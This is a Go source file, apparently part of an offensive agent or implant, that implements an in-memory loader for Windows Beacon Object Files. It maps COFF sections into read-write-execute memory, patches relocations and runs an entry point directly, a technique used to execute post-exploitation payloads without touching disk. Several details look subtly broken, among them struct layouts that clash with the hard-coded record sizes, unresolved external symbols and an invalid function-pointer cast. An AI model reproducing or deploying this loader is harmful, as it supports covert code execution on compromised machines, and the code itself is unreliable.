//go:build windows
// +build windows

package loader

import (
	"fmt"
	"strings"
	"unsafe"
	"bytecode-agent/internal/windows"
)

var (
	procVirtualAlloc = windows.Kernel32.NewProc("VirtualAlloc")
)

// COFF Header Structures
type COFFHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type SectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type Relocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

type COFFSymbol struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       uint8
	NumberOfAuxSymbols uint8
}

const (
	IMAGE_REL_AMD64_ADDR64 = 0x0001
	IMAGE_REL_AMD64_ADDR32 = 0x0002
	IMAGE_REL_AMD64_REL32  = 0x0004
)

// RunBOF is the main entry point for executing a BOF from memory
func RunBOF(data []byte, entryName string) (string, error) {
	if len(data) < 20 {
		return "", fmt.Errorf("invalid COFF data")
	}

	header := (*COFFHeader)(unsafe.Pointer(&data[0]))
	if header.Machine != 0x8664 {
		return "", fmt.Errorf("only x64 BOFs are supported")
	}

	// 1. Map Sections to Memory
	sectionsBase := unsafe.Pointer(uintptr(unsafe.Pointer(header)) + uintptr(unsafe.Sizeof(COFFHeader{})))
	
	type AllocatedSection struct {
		Header SectionHeader
		Ptr    uintptr
	}
	
	allocSections := make([]AllocatedSection, header.NumberOfSections)
	for i := 0; i < int(header.NumberOfSections); i++ {
		secPtr := (*SectionHeader)(unsafe.Add(sectionsBase, uintptr(i)*unsafe.Sizeof(SectionHeader{})))
		allocSections[i].Header = *secPtr
		
		if secPtr.SizeOfRawData > 0 {
			ptr, _, _ := procVirtualAlloc.Call(
				0,
				uintptr(secPtr.SizeOfRawData),
				uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
				uintptr(windows.PAGE_EXECUTE_READWRITE),
			)
			if ptr == 0 {
				return "", fmt.Errorf("failed to allocate section %d", i)
			}
			
			src := data[secPtr.PointerToRawData : secPtr.PointerToRawData+secPtr.SizeOfRawData]
			dest := unsafe.Slice((*byte)(unsafe.Pointer(ptr)), secPtr.SizeOfRawData)
			copy(dest, src)
			allocSections[i].Ptr = ptr
		}
	}

	// 2. Parse Symbol Table
	symbols := make([]COFFSymbol, header.NumberOfSymbols)
	symbolTableBase := unsafe.Add(unsafe.Pointer(header), uintptr(header.PointerToSymbolTable))
	for i := 0; i < int(header.NumberOfSymbols); i++ {
		sym := (*COFFSymbol)(unsafe.Add(symbolTableBase, uintptr(i)*18))
		symbols[i] = *sym
		if sym.NumberOfAuxSymbols > 0 {
			i += int(sym.NumberOfAuxSymbols)
		}
	}

	// 3. Apply Relocations
	for _, sec := range allocSections {
		if sec.Header.NumberOfRelocations == 0 {
			continue
		}

		relocBase := unsafe.Add(unsafe.Pointer(header), uintptr(sec.Header.PointerToRelocations))
		for j := 0; j < int(sec.Header.NumberOfRelocations); j++ {
			rel := (*Relocation)(unsafe.Add(relocBase, uintptr(j)*10))
			sym := symbols[rel.SymbolTableIndex]
			
			var symAddr uintptr
			if sym.SectionNumber > 0 {
				targetSec := allocSections[sym.SectionNumber-1]
				symAddr = targetSec.Ptr + uintptr(sym.Value)
			}

			patchAddr := unsafe.Pointer(sec.Ptr + uintptr(rel.VirtualAddress))
			switch rel.Type {
			case IMAGE_REL_AMD64_ADDR64:
				*(*uintptr)(patchAddr) = symAddr
			case IMAGE_REL_AMD64_REL32:
				offset := int32(symAddr - (uintptr(patchAddr) + 4))
				*(*int32)(patchAddr) = offset
			}
		}
	}

	// 4. Find Entry Point and Execute
	var entryAddr uintptr
	for _, sym := range symbols {
		name := string(sym.Name[:])
		if strings.Contains(name, entryName) {
			if sym.SectionNumber > 0 {
				entryAddr = allocSections[sym.SectionNumber-1].Ptr + uintptr(sym.Value)
				break
			}
		}
	}

	if entryAddr == 0 {
		return "", fmt.Errorf("entry point '%s' not found", entryName)
	}

	// 5. Execute
	f := *(*func())(unsafe.Pointer(&entryAddr))
	f()

	return "[+] BOF execution complete.", nil
}
